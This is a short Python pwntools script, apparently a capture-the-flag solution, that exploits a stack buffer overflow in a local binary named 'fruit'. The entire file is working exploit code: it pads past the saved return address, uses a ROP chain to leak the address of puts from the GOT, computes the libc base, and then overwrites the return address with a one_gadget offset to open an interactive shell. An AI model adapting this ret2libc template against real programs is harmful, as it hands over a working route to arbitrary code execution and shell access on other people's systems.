from pwn import *

def ret2libc():
    p = process("./fruit")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    for i in range(5):
        p.sendline("9")

    binary = ELF("./fruit")
    padding = 0xb0 + 0x8
    plt_puts = binary.symbols["plt.puts"]
    got_puts = binary.symbols["got.puts"]
    main = binary.symbols["main"]
    pop_rdi = 0x0000000000401d33 

    payload = "A" * padding
    payload += p64(pop_rdi) + p64(got_puts) + p64(plt_puts) + p64(main)
    
    p.sendline(payload)

    p.recvuntil("Thanks! we will proceed your request :)\n")
    libc_leak = u64(p.recvline()[:-1].ljust(8, "\x00"))
    log.info("Libc leak : 0x{0:x}".format(libc_leak))
    libc_base = libc_leak - libc.symbols["puts"]
    log.info("Libc base : 0x{0:x}".format(libc_base))
    one_gadget_addr = libc_base + 0x45216
    log.info("One gadget addr : 0x{0:x}".format(one_gadget_addr))

    for i in range(5):
        p.sendline("9")
    
    payload = ""
    payload += "A" * padding
    payload += p64(one_gadget_addr)

    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    ret2libc()